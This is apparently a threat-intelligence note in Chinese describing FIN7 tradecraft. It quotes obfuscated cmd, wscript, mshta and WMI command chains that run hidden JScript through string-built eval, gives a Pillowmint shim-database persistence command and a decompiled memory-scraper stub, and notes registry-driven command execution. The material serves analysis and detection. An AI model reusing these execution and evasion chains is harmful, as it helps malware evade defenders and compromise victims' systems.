# FIN7

## 特征

1. 钓鱼文件在执行时会使用多种执行系统命令的方式来达成混淆.

```bash
cmd.exe /k "SET a01=wscr& SET a02=ipt&&call %a01%%a02% /e:jscript //b %TEMP%\errors.txt
//拼接为wscript执行
cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini
//使用cmd调用wscript.exe执行
wscript.exe //b /e:jscript %TEMP%\debug.txt
//使用wscript.exe执行
@set w=wsc@ript /b /e:js@cript %HOMEPATH%\tt.txt
@echo try{var fs=new ActiveXObject('Scripting.FileSystemObject');sh=new ActiveXObject('Wscript.Shell');p=sh.ExpandEnvironmentStrings('%%HOM'+'EPATH%%')+'\\pp.txt';var f=fs.OpenTextFile(p,1,false);for(i=0;i^<4;i++)f.SkipLine();var com='';while(!f.AtEndOfStream)com+=f.ReadLine().substr(1);f.Close();try{fs.DeleteFile(p, true);}catch(e){}this[String.fromCharCode(101)+'v'+'al'](com);}catch(e){}; >%HOMEPATH%\tt.txt
@copy /y %TMP%\unlock.cmd %HOMEPATH%\pp.txt
@echo %w:@=%|cmd
//混淆后执行unlock.cmd批处理文件里的命令
wmic.exe process call create "cmd start /min cmd /c for /f \"usebackq delims=\" %x in (`FindStr /R /C:\"@#[0-9]#@\" \"%TEMP%\unlock.doc.lnk\"`) do %x|cmd >nul 2>&1 &"
//使用WMI无文件执行
cmd.exe /S /D /c" echo /*@#8#@*/try{sh=new ActiveXObject("Wscript.Shell");fs=new ActiveXObject("Scripting.FileSystemObject");p=sh.ExpandEnvironmentStrings("%TM"+"P%");f=fs.GetFile(p+"//unlock.doc.lnk");s=f.OpenAsTextStream(1,0);c=s.Read(2403);c=s.ReadAll();s.Close();this[String.fromCharCode(101)+'va'+'l'](c);}catch(e){} >%HOMEPATH%\t.txt  & wscript //b /e:jscript %HOMEPATH%\t.txt  >nul 2>&1 &"
//cmd执行混淆后命令调用wscript执行unlock.doc.lnk文件内容
mshta.exe "try{jelo = 'try{w=GetObject("","Wor"+"d.Application");this[String.fromCharCode(101)+\\'va\\'+\\'l\\'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){};';var fso = new ActiveXObject("Scripting.FileSystemObject");var sh = new ActiveXObject("Wscript.Shell");var p = sh.ExpandEnvironmentStrings("%HOMEPATH%") + "\\\\jelo.txt""
//使用mshta绕过
cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\ttt.txt & echo try{w=GetObject("","Wor"+"d.Application");this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text);}catch(e){}; >%HOMEPATH%\ttt.txt & echo %x:@=%|cmd
//简单拼接绕过
%WINDIR%\System32\Wscript.exe %TEMP%\AdobeUpdateManagementTool.vbs
%WINDIR%\System32\Wscript.exe %TEMP%\WindowsUpdate_X24532\beginer.vbs
环境变量绕过执行
```

2. Pillowmint恶意软件通过Shim数据库安装保持持久性:sdbinst.exe -q -p  sdb4F19.sdb.该恶意软件在运行时会先进行10秒的休眠，然后再调用线程.

```C
DWORD __stdcall MemoryScraperThread(LPVOID lpThreadParameter)
{
int v1;
HANDLE v2;
Sleep(10000u);  //休眠10秒
v1= *(&nPriority + *(_DWORD *)(g_priorityIdx + 36));
v2 = GetcurrentThread();
  SetThreadPriority(v2, v1);
  call_back_f(CCMemoryScraper);  //线程函数的运行回调
  return 0;
}
```

3. 恶意软件在执行系统命令时会通过读取注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces中的command值来执行命令，或者从%WinDir%\<system32 or sysnative>\sysvols\commands.txt文件中执行命令.
